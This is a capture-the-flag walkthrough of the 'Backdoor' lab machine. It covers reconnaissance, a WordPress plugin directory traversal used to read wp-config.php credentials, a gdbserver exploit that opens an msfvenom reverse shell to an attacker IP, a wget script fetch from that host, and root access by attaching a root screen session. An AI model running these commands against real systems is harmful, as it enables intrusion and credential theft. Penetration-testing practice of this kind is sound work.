# Backdoor
## Reconnaissance
## Run Nmap Automator
* Run the Nmap Automator on the target machine.
```bash
sudo ./nmapAutomator.sh 10.10.11.125 All
```
* From the result, three open ports are found.

![1_nmapAutomator](https://user-images.githubusercontent.com/53956303/165188127-0f1944ce-7af2-4fb4-91d8-cadacf4e9c71.jpg)
## Wpscan on Port 80
* Since Wordpress 5.8.1 is found on the Http, scan the webpage using Wpscan
    * Scan for usernames and plugins.
```bash
sudo wpscan --url 10.10.11.125 -e u,p
```
* From the result, nothing but a username "admin" is found.

![2_user](https://user-images.githubusercontent.com/53956303/165188147-11916c6b-9fe0-47cf-8d0d-8b5256f55d6c.jpg)

## FFuf scan
* From the FFuf dirtectory sacnning on the NmapAutomator, some directories on the port 80 are found.

![3_ffuf](https://user-images.githubusercontent.com/53956303/165188197-36de2e10-468d-481f-be2b-d2097217fea2.jpg)
## Enumerate "Wp-content" directory
* To enumerate the plugins not ditermined from the scanning, enumerate the "Wp-content" directory.
    * Run gobueter on the directory.
```bash
gobuster -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -u http://10.10.11.125/wp-content -x sh,php,html,txt
```
* From the result, `/plugins` directory is found.

![4_Plugins](https://user-images.githubusercontent.com/53956303/165188224-2002a16e-4b87-4f65-8d0f-063106d11aa6.jpg)
### Enumerate "Plugins" directory
* From the directory, one directory and a php file "hello.php" are found.

![5_directory](https://user-images.githubusercontent.com/53956303/165188249-e01c95ff-a8d5-4acf-9d36-c975e54cdfdc.jpg)
### Enumerate "ebook-download" directory
* It seems like a directory for a plugin.
    * From inside of that directory, `readme.txt`, which contains a plugin version number, is found.

![6_version](https://user-images.githubusercontent.com/53956303/165188267-5a2c5da3-cadb-4435-95bd-abe1544f359e.jpg)
## Exploit
## WordPress Plugin eBook Download 1.1 - Directory Traversal
* From Exploit DB, a [WordPress plugin eBook Download 1.1 - Directory Traversal](https://www.exploit-db.com/exploits/39575) is found.
    * Using the exploit to extract data from `wp-congig.php`

![7_wp-conig](https://user-images.githubusercontent.com/53956303/165188289-393a48fa-0d4f-4cd9-bbcb-3a231ce6984f.jpg)
* From the file, some credentials are found, but no luck that credentials are working on SSH neither on the Wordpress login.

## GNU gbdserver 9.2 - Remote Command Execution (RCE)
* There has not much information to detect which app is running on port 1337 (Nc, curl nor telnet working). However, sometimes a GDBserver is running on that port.

|[GNU gdserver 9.2 - Remote Command Execution (RCE) Port 1337](https://www.exploit-db.com/exploits/50539)|
|----|
* Follow the instruction to execute the exploit.

![8_exploit](https://user-images.githubusercontent.com/53956303/165188310-a13ada9e-1f05-4c74-bb1f-fd0776a0870e.jpg)
### 1. Generate the exploit using msfvenom
```bash
msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.14.147 LPORT=4444 PrependFork=true -o rev.bin
```
![9_exploit](https://user-images.githubusercontent.com/53956303/165188324-3d1c5245-54a3-4e50-ac84-35849e767428.jpg)
### 2. Listen with Netcat
```bash
sudo nc -lnvp 4444
```
### 3. Execute the exploit
```bash
python3 gdb_exploit.py 10.10.11.125:1337 rev.bin
```
![10_execute](https://user-images.githubusercontent.com/53956303/165188403-b9bc6147-8b7b-4e96-9cd2-f0bcfa5dc041.jpg)
* As a result, a reverse shell as "user" is open.

![11_user](https://user-images.githubusercontent.com/53956303/165188432-5421fe9b-9c20-402f-9c01-db23ae7df8c6.jpg)
## Privilege Escalation
### Spwan a stable shell
```bash
python3 -c "import pty;pty.spawn('/bin/bash')"
ctrl + z
stty raw -echo; fg
```
* As a result, a stable shell is opened.

![12_shell](https://user-images.githubusercontent.com/53956303/165188449-dfbc2010-fbca-4769-8c7c-6f41a258fabe.jpg)
### Post-Enumeration
* Use Linpea.sh to enumerate the target machine.
### Transfer the script from the attacking machine
```bash
# Kali
sudo python3 -m http.server 80

# Target machine
cd /tmp
wget http://10.10.14.147/linpea.sh .
```
### Execute the Linpea.sh
```bash
chmod +x linpea.sh
./linpea.sh
```
* From the result, a possible vulnerable point is found from Processes section.

![15_screen](https://user-images.githubusercontent.com/53956303/165188486-56c4bb84-5a07-4b6a-ad5c-0bf51c7210fe.jpg)
* From the result, root used `-dmS` and `-x` flags to attach to a not detached screen (Multi display mode) according to the help message of `screen` application.

![16_screen](https://user-images.githubusercontent.com/53956303/165188508-af567c65-73de-4b57-8b16-997eebd03433.jpg)
* Attach the root's session
```bash
screen -x root/
```
* As a result, a root shell is opened.

![17_root](https://user-images.githubusercontent.com/53956303/165188517-ca0c121f-a70a-4b6a-8545-2be549b5e0dc.jpg)
